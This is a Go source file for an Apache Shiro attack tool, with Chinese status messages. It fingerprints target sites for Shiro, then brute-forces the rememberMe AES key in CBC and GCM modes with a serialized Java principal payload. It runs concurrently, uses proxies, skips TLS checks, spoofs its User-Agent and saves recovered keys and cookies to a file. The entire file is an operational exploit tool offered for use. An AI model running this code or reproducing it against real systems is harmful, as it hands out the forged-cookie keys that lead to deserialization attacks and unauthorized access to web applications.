package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/panjf2000/ants/v2"
)

type Shiro struct {
	RememberMe   string
	Keys         []string
	TargetThread int
	KeyThread    int
	FilterStatus []int
	targets      []string
	status       map[string]bool
	Proxy        string
	Method       string
	Params       string
	Output       string
}

var tmp string

func (s Shiro) httpClient(target string, proxy string, cookie string) (*http.Response, error) {
	var p *url.URL
	var req *http.Request
	var err error
	if proxy != "" {
		p, _ = url.Parse(proxy)
	}
	if s.Method == "get" {
		req, err = http.NewRequest("GET", target, nil)
	} else if s.Method == "post" {
		req, err = http.NewRequest("POST", target, strings.NewReader(s.Params))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	if err != nil {
		return nil, err
	}
	req.Header.Set("Cookie", s.RememberMe+"="+cookie)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
	req.Header.Add("Connection", "close")

	c := http.Client{
		Transport: &http.Transport{
			Proxy:           http.ProxyURL(p),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: 15 * time.Second,
	}
	t, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	return t, nil
}

func (s *Shiro) is_Shiro() []string {
	var rst []string
	s.status = make(map[string]bool)
	for _, target := range s.targets {
		resp, err := s.httpClient(target, s.Proxy, "1")
		if err == nil {
			defer resp.Body.Close()
			for _, cookie := range resp.Header.Values("Set-Cookie") {
				if strings.Contains(cookie, s.RememberMe+"=deleteMe") {
					rst = append(rst, target)
					s.status[target] = false
					fmt.Println(color.CyanString("[+]"), target, " is Shiro")
					break
				}
			}
		} else if strings.Contains(err.Error(), "proxyconnect tcp") {
			fmt.Println(color.RedString("[-]"), "代理连接失败")
			os.Exit(0)
		}
	}
	return rst
}

func (s *Shiro) checkTargets() {
	fmt.Println(color.CyanString("[+]"), "正在对所有目标进行Shiro框架识别")
	targets := s.is_Shiro()
	FindShiroKey := func(target string, key string, ver int) (string, string, int, int, bool) {
		var rememberMe string
		var err error
		if ver == 1 {
			rememberMe, err = s.AesGCMEncrypt(key)
			if err != nil {
				return "", "", -1, -1, false
			}
		} else {
			rememberMe, err = s.AesCBCEncrypt(key)
			if err != nil {
				return "", "", -1, -1, false
			}
		}
		resp, err := s.httpClient(target, s.Proxy, rememberMe)
		if err != nil {
			return "", "", -1, -1, false
		}
		for _, sc := range s.FilterStatus {
			if sc == resp.StatusCode {
				return "", "", -1, -1, false
			}
		}
		defer resp.Body.Close()
		var cookies string
		for _, cookie := range resp.Header.Values("Set-Cookie") {
			cookies += cookie
		}

		if !strings.Contains(cookies, s.RememberMe+"=deleteMe") {
			return target, s.RememberMe + "=" + rememberMe, ver, resp.StatusCode, true
		}
		return "", "", -1, -1, false
	}

	var mutex = sync.Mutex{}

	defer ants.Release()
	var wg sync.WaitGroup
	p, _ := ants.NewPoolWithFunc(s.TargetThread, func(t interface{}) {
		target := t.(string)
		var wg2 sync.WaitGroup
		p2, _ := ants.NewPoolWithFunc(s.KeyThread, func(v interface{}) {
			t := v.([]string)
			target := t[0]
			key := t[1]
			ver, _ := strconv.Atoi(t[2])
			_, cookie, _, statusCode, is := FindShiroKey(target, key, ver)
			if is == true {
				mutex.Lock()
				if ver == 1 {
					fmt.Println(color.RedString("[+]"), target+"--GCM-key:"+key, "响应状态码:", statusCode)
					fmt.Println(cookie)
					s.status[target] = true
					tmp += fmt.Sprintln("目标：", target, "\n响应状态码：", statusCode, "\nGCM-key: ", key, "\n"+cookie+"\n\n")
				} else {
					fmt.Println(color.RedString("[+]"), target+"--CBC-key:"+key, "响应状态码:", statusCode)
					fmt.Println(cookie)
					s.status[target] = true
					tmp += fmt.Sprintln("目标：", target, "\n响应状态码：", statusCode, "\nCBC-key: ", key, "\n"+cookie+"\n\n")
				}
				mutex.Unlock()
			}
			wg2.Done()
		})
		defer p2.Release()
		wg2.Wait()

		for ver := 0; ver < 2; ver++ {
			for _, key := range s.Keys {
				if s.status[target] == true {
					break
				}
				wg2.Add(1)
				_ = p2.Invoke([]string{target, key, strconv.Itoa(ver)})
			}
		}
		wg2.Wait()
		fmt.Println(color.CyanString("[+]"), "目标", target, "爆破结束")
		wg.Done()
	})
	defer p.Release()

	for _, target := range targets {
		wg.Add(1)
		_ = p.Invoke(target)
	}
	wg.Wait()
	err := ioutil.WriteFile(s.Output, []byte(tmp), 0644)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(color.CyanString("[+]"), "全部目标爆破完成")
	fmt.Println(color.CyanString("[+]"),"输出结果保存在",s.Output)
}

func (s Shiro) AesCBCEncrypt(k string) (string, error) {
	data, _ := base64.StdEncoding.DecodeString("rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==")
	key, _ := base64.StdEncoding.DecodeString(k)
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	blockSize := block.BlockSize()
	pkcs7Padding := func(data []byte, blockSize int) []byte {
		padding := blockSize - len(data)%blockSize
		padText := bytes.Repeat([]byte{byte(padding)}, padding)
		return append(data, padText...)
	}
	encryptBytes := pkcs7Padding(data, blockSize)
	crypted := make([]byte, len(encryptBytes))
	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])
	blockMode.CryptBlocks(crypted, encryptBytes)
	base64_cipher := base64.StdEncoding.EncodeToString(append(key[:blockSize], crypted...))
	return base64_cipher, nil
}

func (s Shiro) AesGCMEncrypt(k string) (string, error) {
	key, _ := base64.StdEncoding.DecodeString(k)
	data := "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
	c, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, 16)
	io.ReadFull(rand.Reader, nonce)
	aesgcm, _ := cipher.NewGCMWithNonceSize(c, 16)
	ciphertext := aesgcm.Seal(nil, nonce, []byte(data), nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...)), nil
}
